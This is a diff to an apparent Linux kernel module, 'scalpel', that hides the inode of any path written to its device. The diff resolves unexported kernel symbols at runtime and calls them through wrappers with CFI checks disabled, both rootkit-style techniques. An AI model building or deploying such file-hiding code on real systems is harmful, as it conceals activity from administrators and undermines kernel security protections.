@@ -1,6 +1,6 @@
 /* SPDX-License-Identifier: GPL-2.0 */
 /*
- * scalpel/scalpel.c - Main module for scalpel device
+ * scalpel/scalpel_main.c - Main module for scalpel device
  *
  * Copyright (C) 2026 Kaidevon
  */
@@ -19,13 +19,21 @@
 
 typedef int (*kern_path_t)(const char *name, unsigned int flags,
 			   struct path *path);
+typedef void (*path_put_t)(const struct path *path);
 
 static kern_path_t kern_path_fn;
+static path_put_t path_put_fn;
 
 __attribute__((no_sanitize("cfi"))) static int
 call_kern_path(const char *name, unsigned int flags, struct path *path)
 {
 	return kern_path_fn(name, flags, path);
+}
+
+__attribute__((no_sanitize("cfi"))) static void
+call_path_put(const struct path *path)
+{
+	path_put_fn(path);
 }
 
 static int scalpel_open(struct inode *inode, struct file *file)
@@ -60,14 +68,14 @@ static ssize_t scalpel_write(struct file *file, const char __user *buf,
 	}
 
 	if (!path.dentry->d_inode) {
-		path_put(&path);
+		call_path_put(&path);
 		kfree(path_str);
 		return -ENOENT;
 	}
 
 	ret = hide_inode(path.dentry->d_inode);
 
-	path_put(&path);
+	call_path_put(&path);
 	kfree(path_str);
 
 	if (ret == 0 || ret == -EEXIST)
@@ -105,6 +113,13 @@ static int __init scalpel_init(void)
 
 	if (!kern_path_fn)
 		kern_path_fn = (kern_path_t)ksym_get("kern_path");
+	if (!path_put_fn)
+		path_put_fn = (path_put_t)ksym_get("path_put");
+
+	if (!kern_path_fn || !path_put_fn) {
+		pr_err("scalpel: failed to resolve required symbols\n");
+		return -EINVAL;
+	}
 
 	ret = misc_register(&scalpel_misc);
 	if (ret)
@@ -143,3 +158,4 @@ module_exit(scalpel_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Kaidevon");
 MODULE_DESCRIPTION("scalpel device.");
+MODULE_VERSION("0.0.1");
